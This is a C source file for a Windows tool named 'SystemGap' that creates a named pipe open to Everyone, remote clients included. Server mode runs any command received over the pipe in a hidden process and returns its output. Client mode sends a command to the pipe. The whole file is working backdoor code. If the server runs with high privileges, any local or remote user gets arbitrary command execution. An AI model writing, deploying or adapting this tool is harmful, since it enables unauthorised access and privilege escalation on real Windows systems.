#include <Windows.h>
#include <stdio.h>
#include <aclapi.h>
#include <string.h>

#define BUFF_SIZE 1024
#define PIPE_NAME "\\\\.\\pipe\\SystemGap"

BOOL GenerateEveryoneSecAttr(PSECURITY_ATTRIBUTES sa);
VOID TransmissionData(HANDLE hRead, HANDLE hGap);
BOOL ExecCommand(HANDLE hGap, char* szBuffer);
BOOL CheckServerRunning(char* gap_name);
HANDLE CreateSystemGap(char* gap_name);
void HandleGapMsg(HANDLE hGap);
BOOL ReceiveSystemGapMsg(HANDLE hGap);
BOOL SendSystemGapMsg(char* gap_name, char* msg, int msg_len);
void StartServer();
void StartClient(char* command);
void ShowUsage();

BOOL GenerateEveryoneSecAttr(PSECURITY_ATTRIBUTES sa) {
	PSID pEveryoneSID = NULL;
	PACL pACL = NULL;
	PSECURITY_DESCRIPTOR pSD = NULL;
	EXPLICIT_ACCESS ea[1];
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
	SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
	DWORD dwRes = 0;

	if (!AllocateAndInitializeSid(&SIDAuthWorld, 1,
		SECURITY_WORLD_RID,
		0, 0, 0, 0, 0, 0, 0,
		&pEveryoneSID))
	{
		printf("[-]AllocateAndInitializeSid Error %u\n", GetLastError());
		return FALSE;
	}

	ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
	ea[0].grfAccessPermissions = GENERIC_ALL;
	ea[0].grfAccessMode = SET_ACCESS;
	ea[0].grfInheritance = NO_INHERITANCE;
	ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea[0].Trustee.ptstrName = (LPTSTR)pEveryoneSID;
	dwRes = SetEntriesInAcl(1, ea, NULL, &pACL);
	if (ERROR_SUCCESS != dwRes)
	{
		printf("[-]SetEntriesInAcl Error %u\n", GetLastError());
		return FALSE;
	}
	pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
	if (!InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION))
	{
		printf("[-]InitializeSecurityDescriptor Error %u\n", GetLastError());
		return FALSE;
	}
	if (!SetSecurityDescriptorDacl(pSD,
		TRUE,
		pACL,
		FALSE))
	{
		printf("[-]SetSecurityDescriptorDacl Error %u\n", GetLastError());
		return FALSE;
	}

	sa->nLength = sizeof(SECURITY_ATTRIBUTES);
	sa->lpSecurityDescriptor = pSD;
	sa->bInheritHandle = FALSE;
	return TRUE;
}

VOID TransmissionData(HANDLE hRead, HANDLE hGap) {
	char buff[100] = { 0 };
	memset(buff, 0, 100);
	DWORD dwRead = 0, dwLen;
	while (ReadFile(hRead, buff, 100, &dwRead, NULL) != 0)
	{
		WriteFile(hGap, buff, dwRead, &dwLen, NULL);
		memset(buff, 0, 100);
	}
	CloseHandle(hRead);
}

BOOL ExecCommand(HANDLE hGap, char* szBuffer) {
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
	HANDLE hRead, hWrite;
	if (!CreatePipe(&hRead, &hWrite, &sa, 0))
	{
		return FALSE;
	}
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;
	PROCESS_INFORMATION pi;
	if (!CreateProcess(NULL, szBuffer, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
	{
		return FALSE;
	}
	CloseHandle(hWrite);
	TransmissionData(hRead, hGap);
	return TRUE;
}

BOOL CheckServerRunning(char* gap_name) {
	HANDLE hPipe = CreateFile(gap_name, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hPipe != INVALID_HANDLE_VALUE) {
		CloseHandle(hPipe);
		return TRUE;
	}
	return FALSE;
}

HANDLE CreateSystemGap(char* gap_name)
{
	DWORD dwRes = 0;
	if (NULL == gap_name) {
		return NULL;
	}

	if (CheckServerRunning(gap_name)) {
		printf("[-]SystemGap server is already running!\n");
		printf("[-]Please stop the existing server before starting a new one.\n");
		exit(1);
	}

	SECURITY_ATTRIBUTES sa;
	if (GenerateEveryoneSecAttr(&sa) == FALSE)
	{
		printf("[-]Generate PSECURITY_ATTRIBUTES Error %u\n", GetLastError());
		return NULL;
	}
	HANDLE hPipe = CreateNamedPipeA(
		gap_name,
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS,
		PIPE_UNLIMITED_INSTANCES,
		BUFF_SIZE,
		BUFF_SIZE,
		0,
		&sa);

	if (hPipe == INVALID_HANDLE_VALUE) {
		dwRes = GetLastError();
		printf("[-]Create Pipe Error %d \n", dwRes);
		return NULL;
	}

	if (ERROR_SUCCESS != dwRes) {
		printf("[-]SetNamedSecurityInfo Error %u\n", dwRes);
		return NULL;
	}

	printf("[+]Create Gap Success...\n");
	return hPipe;
}

void HandleGapMsg(HANDLE hGap) {
	while (TRUE) {
		Sleep(1000);
		printf("[+]Waiting for Client....\n");
		if (ConnectNamedPipe(hGap, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED)) {
			char szBuffer[BUFF_SIZE];
			memset(szBuffer, 0, BUFF_SIZE);
			DWORD dwLen;
			ReadFile(hGap, szBuffer, BUFF_SIZE, &dwLen, NULL);
			printf("[+]Receive %d bytes.\n", dwLen);
			if (!ExecCommand(hGap, szBuffer)) {
				printf("[+]Execute Error %d \n", GetLastError());
			}

			DisconnectNamedPipe(hGap);
		}
	}
	return;
}

BOOL ReceiveSystemGapMsg(HANDLE hGap) {
	DWORD dwBytesRead = 0;
	char buffer[101] = { 0 };
	if (hGap == NULL)
		return FALSE;
	while (ReadFile(hGap, buffer, 100, &dwBytesRead, NULL) != 0 && dwBytesRead > 0)
	{
		buffer[dwBytesRead] = '\0';
		printf("%s", buffer);
		memset(buffer, 0, 101);
	}
	return TRUE;
}

BOOL SendSystemGapMsg(char* gap_name, char* msg, int msg_len) {
	DWORD dwWritten = 0;
	WaitNamedPipe(gap_name, NMPWAIT_WAIT_FOREVER);
	HANDLE hGap = CreateFile(gap_name, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hGap == INVALID_HANDLE_VALUE) {
		printf("[-]Can't Open Gap Error %d \n", GetLastError());
		return FALSE;
	}
	WriteFile(hGap, msg, msg_len, &dwWritten, NULL);
	if (dwWritten == msg_len) {
		ReceiveSystemGapMsg(hGap);
		CloseHandle(hGap);
		return TRUE;
	}
	CloseHandle(hGap);
	return FALSE;
}

void StartServer() {
	printf("[+]Starting SystemGap Server...\n");
	HANDLE hGap = CreateSystemGap(PIPE_NAME);
	if (hGap != INVALID_HANDLE_VALUE)
	{
		HandleGapMsg(hGap);
		CloseHandle(hGap);
	}
}

void StartClient(char* command) {
	SendSystemGapMsg(PIPE_NAME, command, strlen(command));
}

void ShowUsage() {
	printf("SystemGap All-in-One Tool\n");
	printf("Usage:\n");
	printf("  SystemGapAll.exe              Start server mode (default)\n");
	printf("  SystemGapAll.exe -c <command> Start client mode and send command\n");
}

int main(int argc, char* argv[]) {
	if (argc == 1) {
		StartServer();
	}
	else if (argc == 2 && (strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--help") == 0)) {
		ShowUsage();
		return 0;
	}
	else if (strcmp(argv[1], "-c") == 0) {
		if (argc < 3) {
			printf("[-]Error: -c option requires a command.\n");
			ShowUsage();
			return 1;
		}
		StartClient(argv[2]);
	}
	else {
		printf("[-]Error: Unknown option '%s'\n", argv[1]);
		ShowUsage();
		return 1;
	}

	return 0;
}
